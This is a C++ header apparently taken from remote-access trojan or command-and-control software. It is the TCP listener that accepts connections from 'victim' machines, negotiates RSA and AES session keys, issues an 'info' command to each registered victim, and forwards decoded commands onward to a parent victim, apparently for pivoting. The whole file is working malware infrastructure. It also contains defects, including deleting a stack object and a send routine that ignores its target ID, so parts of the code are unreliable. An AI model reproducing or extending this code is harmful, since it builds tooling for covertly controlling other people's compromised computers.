#pragma once

#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <thread>
#include <vector>
#include <string>

#include "clsVictim.hpp"
#include "clsEDP.hpp"
#include "clsEZData.hpp"
#include "clsTools.hpp"
#include "clsCrypto.hpp"
#include "clsDebugTools.hpp"

class clsLtnTcp
{
private:
    clsVictim m_vicParent;

    int m_nSktSrv = -1;
    int m_nPort;
    std::vector<std::thread> m_threads;

    std::string m_szRSAPublicKey;
    std::string m_szRSAPrivateKey;
    std::vector<unsigned char> m_vuRSAPublicKey;
    std::vector<unsigned char> m_vuRSAPrivateKey;

    std::vector<clsVictim> m_vVictim;

public:
    bool m_bListening = false;

public:
    clsLtnTcp() = default;

    clsLtnTcp(clsVictim& victim, int nPort, const std::string& szRSAPublicKey, const std::string& szRSAPrivateKey)
    {
        m_vicParent = victim;
        m_nPort = nPort;

        m_szRSAPublicKey = szRSAPublicKey;
        m_szRSAPrivateKey = szRSAPrivateKey;

        m_vuRSAPublicKey = clsEZData::fnb64Decode(szRSAPublicKey);
        m_vuRSAPrivateKey = clsEZData::fnb64Decode(szRSAPrivateKey);

        m_nSktSrv = socket(AF_INET, SOCK_STREAM, 0);
        m_bListening = false;

        sockaddr_in srvAddr {};
        srvAddr.sin_family = AF_INET;
        srvAddr.sin_port = htons(nPort);
        srvAddr.sin_addr.s_addr = INADDR_ANY;

        int nOpt = 1;
        setsockopt(m_nSktSrv, SOL_SOCKET, SO_REUSEADDR, &nOpt, sizeof(nOpt));
        bind(m_nSktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr));
    }

    ~clsLtnTcp() = default;

    void fnStart()
    {
        listen(m_nSktSrv, 1000);
        
        clsTools::fnLogInfo("Listening...");

        m_bListening = true;
        while (m_bListening)
        {
            sockaddr_in clntAddr {};
            socklen_t nLen = sizeof(clntAddr);

            int nSktClnt = accept(m_nSktSrv, (sockaddr *)&clntAddr, &nLen);
            if (nSktClnt < 0)
            {
                perror("accept");
                continue;
            }

            m_threads.emplace_back(&clsLtnTcp::fnHandler, this, nSktClnt, clntAddr);
            m_threads.back().detach();
        }
    }

    void fnStop()
    {
        close(m_nSktSrv);
    }

    void fnSendToSub(std::string& szSubID, std::vector<std::string>& vuMsg)
    {
        for (int i = 0; i < m_vVictim.size(); i++)
        {
            m_vVictim[i].fnSendCommand(vuMsg, true);
        }
    }

private:
    void fnHandler(int nSktClnt, sockaddr_in clntAddr)
    {
        clsTools::fnLogInfo("Accepted");

        int nRecv = 0;
        std::vector<unsigned char> vuStaticRecvBuf(clsEDP::MAX_SIZE);
        std::vector<unsigned char> vuDynamicRecvBuf;

        clsCrypto crypto(m_vuRSAPublicKey, m_vuRSAPrivateKey);
        clsVictim victim(clsVictim::enMethod::TCP, nSktClnt, crypto);
        
        victim.fnSend(1, 0, m_szRSAPublicKey);

        do
        {
            // Receive data
            std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
            nRecv = recv(nSktClnt, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);

            if (nRecv <= 0)
                break; // socket closed or error

            // Append to dynamic buffer
            vuDynamicRecvBuf.insert(
                vuDynamicRecvBuf.end(),
                vuStaticRecvBuf.begin(),
                vuStaticRecvBuf.begin() + nRecv);

            while (true)
            {
                // not enough for header yet
                if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE)
                    break;

                auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);

                // incomplete packet — wait for next recv
                if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
                    break;

                // construct EDP from full message
                clsEDP edp(vuDynamicRecvBuf);
                vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet

                auto [cmd, param, len, vuMsg] = edp.fnGetMsg();
                
                printf("%d,%d\n", cmd, param);

                if (cmd == 0)
                {
                    if (param == 0)
                    {
                        //close(nSktClnt);
                    }
                }
                else if (cmd == 1)
                {
                    if (param == 1)
                    {
                        std::string szb64Cipher(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                        std::vector<unsigned char> abCipher = clsEZData::fnb64Decode(szb64Cipher);
                        std::vector<unsigned char> abPlain = victim.m_crypto.fnvuRSADecrypt(abCipher.data(), abCipher.size());

                        std::string szPlain(abPlain.begin(), abPlain.end());
                        auto pos = szPlain.find('|');

                        std::string szKey = szPlain.substr(0, pos);
                        std::string szIV = szPlain.substr(pos + 1);

                        std::vector<unsigned char> vuAESKey = clsEZData::fnb64Decode(szKey);
                        std::vector<unsigned char> vuAESIV = clsEZData::fnb64Decode(szIV);

                        victim.m_crypto.fnAesSetNewKeyIV(vuAESKey, vuAESIV);

                        // Send challenge (C#: param 2)
                        std::string szChallenge = clsEZData::fnszGenerateRandomStr();
                        victim.m_crypto.m_szChallenge = szChallenge;
                        victim.fnSend(1, 2, szChallenge);
                    }
                    else if (param == 3)
                    {
                        std::string szb64Cipher(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());

                        std::vector<unsigned char> vuCipher = clsEZData::fnb64Decode(szb64Cipher);

                        std::vector<unsigned char> vuPlain = victim.m_crypto.fnvuAESDecrypt(vuCipher.data(), vuCipher.size());
                        std::string szPlain(reinterpret_cast<const char*>(vuPlain.data()), vuPlain.size());

                        if (szPlain == victim.m_crypto.m_szChallenge)
                        {
                            STRLIST ls = {
                                "info",
                            };

                            m_vVictim.push_back(victim);

                            victim.fnSendCommand(ls, true);
                        }
                        else
                        {
                            clsTools::fnLogErr("Validation is failed.");
                        }
                    }
                }
                else if (cmd == 2)
                {
                    if (param == 0)
                    {
                        std::vector<unsigned char> vuPlain = victim.m_crypto.fnvuAESDecrypt(vuMsg);
                        std::string szMsg(vuPlain.begin(), vuPlain.end());

                        auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
                        //decoded.insert(decoded.begin(), m_vicParent.m_szVictimID);

                        clsDebugTools::fnPrintStringList(decoded);

                        m_vicParent.fnSendCommand(decoded);
                    }
                }
            }

        } while (nRecv > 0);

        m_vVictim.erase(std::remove(m_vVictim.begin(), m_vVictim.end(), victim), m_vVictim.end());
        close(nSktClnt);


        delete &victim;
    }
};